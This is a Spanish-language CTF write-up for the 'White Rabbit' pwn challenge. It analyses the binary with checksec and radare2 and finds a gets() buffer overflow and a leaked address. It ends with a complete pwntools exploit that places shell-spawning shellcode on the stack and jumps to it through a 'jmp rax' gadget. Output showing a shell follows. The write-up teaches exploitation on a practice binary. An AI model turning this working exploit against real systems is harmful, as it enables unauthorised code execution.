# Begginers / White Rabbit

Un reto de pwn, analizamos las propiedades del ejecutable

``` bash
checksec --file=white_rabbit 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   31 Symbols	  No	0		2	white_rabbit
```

+ No canary found: Es vulnerable a buffer overflow

+ NX disabled: El codigo de la pila es ejecutable

Observamos el binario
``` bash
./white_rabbit 

  (\_/)
  ( •_•)
  / > 0x5609dc927180

follow the white rabbit...
```

Nos filtran una direccion de memoria y podemos introducir datos. Desensamblamos el programa con Radare2 y observamos mejor este comportamiento al desensamblar sym.main y sym.follow respectivamente

``` asm
|           0x000011fc      488d057dff..   lea rax, [sub.dbg.main_1180] ; warmup.c:20 ; 0x1180
|           0x00001203      4889c6         mov rsi, rax
|           0x00001206      488d050d0e..   lea rax, str._______p_n_n   ; 0x201a ; "  / > %p\n\n"
|           0x0000120d      4889c7         mov rdi, rax                ; const char *format
|           0x00001210      b800000000     mov eax, 0  
|           0x00001215      e826feffff     call sym.imp.printf         ; int printf(const char *format)
```

``` asm
            ;-- follow:
            ; CALL XREF from sub.dbg.main_1180 @ 0x122e(x)
/ 23: sub.dbg.follow_1169 ();
| afv: vars(1:sp[0x78..0x78])
|           0x00001169      55             push rbp                    ; warmup.c:8 ; void follow();
|           0x0000116a      4889e5         mov rbp, rsp
|           0x0000116d      4883ec70       sub rsp, 0x70
|           0x00001171      488d4590       lea rax, [buf]              ; warmup.c:10
|           0x00001175      4889c7         mov rdi, rax                ; char *s
|           0x00001178      e8d3feffff     call sym.imp.gets           ; char *gets(char *s)
|           0x0000117d      90             nop                         ; warmup.c:11
|           0x0000117e      c9             leave
\           0x0000117f      c3             ret
```

Podemos ver que la dirección que se filtra es la de la función main, luego en sym.follow se encuentra la entrada de usuario capturada con gets (una función vulnerable). 

Podemos darnos cuenta de que se reservan 120 bytes antes de la direccion de retorno de main:

``` asm
    push rbp  -> reserva 8 bytes porque estamos en una arquitectura x86_64 y por lo tanto este registro es de 64 bits
    sub rsp, 0x70   ->  reserva 0x70(112 en decimal) bytes
```

Entonces ya tenemos el offset, probamos a llamar de nuevo a una dirección conocida (como main) para comprobar nuestra suposición

``` python3
# test.py
from pwn import *
import re

io = process('./white_rabbit')
elf = context.binary = ELF('./white_rabbit')

leak = io.recv()                                                
main = int(re.findall(b'0x[a-f0-9]+',leak)[0].decode(),0)       # Extraemos la direccion de memoria con una expresion regular

print(leak.decode())
payload = cyclic(120)                                           # offset
payload += p64(main)                                            # retorno

io.sendline(payload)

print(io.recv().decode())
io.close()
```


``` bash
python3 test.py 
[+] Starting local process './white_rabbit': pid 8850
[*] '/home/kalcast/Descargas/World_Wide_CTF_2024/Begginers/WhiteRabbit/white_rabbit'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes

  (\_/)
  ( •_•)
  / > 0x555f7a73d180

follow the white rabbit...


  (\_/)
  ( •_•)
  / > 0x555f7a73d180

follow the white rabbit...

[*] Stopped process './white_rabbit' (pid 8850)
```

En efecto, tenemos control de RIP. Ahora tenemos que introducir un shellcode en la pila y encontrar una forma de apuntar a esta dirección

``` asm
   lea rax, [buf]   -> rax almacena la direccion base del buffer en la pila
```

Buscamos un gadget del tipo 'jmp rax'. En radare podemos hacer esto con `/R jmp rax`

``` asm 
/R jmp rax
  0x000010b1               7415  je 0x10c8
  0x000010b3     488b050e2f0000  mov rax, qword [rip + 0x2f0e]
  0x000010ba             4885c0  test rax, rax
  0x000010bd               7409  je 0x10c8
  0x000010bf               ffe0  jmp rax
``` 

Buscamos su desplazamiento con respecto a la direccion de main. Podemos ver la direccion de main listando las funciones con `afl` 

``` bash
python3
Python 3.12.7 (main, Oct  3 2024, 15:15:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x00001180-0x000010bf)
'0xc1'
```

Ya tenemos todo lo necesario

``` python3
# rabbit.py
from pwn import *
import re

io = process('./white_rabbit')
elf = context.binary = ELF('./white_rabbit')

leak = io.recv()
main = int(re.findall(b'0x[a-f0-9]+',leak)[0].decode(),0)
shellcode = asm(shellcraft.sh())                           
jmp_rax = main - 0xc1

payload = shellcode
payload += cyclic(120-len(shellcode))
payload += p64(jmp_rax)

io.sendline(payload)
io.interactive()
io.close()
```

``` bash
 python3 rabbit.py 
[+] Starting local process './white_rabbit': pid 9346
[*] '/home/kalcast/Descargas/World_Wide_CTF_2024/Begginers/WhiteRabbit/white_rabbit'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
[*] Switching to interactive mode
$ ls
rabbit.py  test.py  white_rabbit
```





